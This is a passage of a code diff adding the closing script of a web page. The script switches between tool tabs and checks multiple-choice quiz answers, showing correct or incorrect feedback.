+        tab.addEventListener("click", () => {
+          const target = tab.getAttribute("data-target");
+          toolTabs.forEach((btn) => {
+            btn.classList.toggle("active", btn === tab);
+            btn.setAttribute("aria-selected", btn === tab ? "true" : "false");
+          });
+          toolPanels.forEach((panel) => {
+            panel.classList.toggle("active", panel.id === `tool-${target}`);
+          });
+        });
+      });
+
+      const checkButtons = document.querySelectorAll(".check-answer");
+      checkButtons.forEach((button) => {
+        button.addEventListener("click", () => {
+          const form = button.closest(".mcq-form");
+          const selected = form.querySelector("input[type='radio']:checked");
+          const feedback = form.querySelector(".mcq-feedback");
+          const answer = form.getAttribute("data-answer");
+
+          if (!selected) {
+            feedback.textContent = "Select an option to check.";
+            feedback.classList.remove("text-success", "text-danger");
+            feedback.classList.add("text-secondary");
+            return;
+          }
+
+          if (selected.value === answer) {
+            feedback.textContent = "Correct!";
+            feedback.classList.remove("text-secondary", "text-danger");
+            feedback.classList.add("text-success");
+          } else {
+            feedback.textContent = "Not quite. Review the evidence above.";
+            feedback.classList.remove("text-secondary", "text-success");
+            feedback.classList.add("text-danger");
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
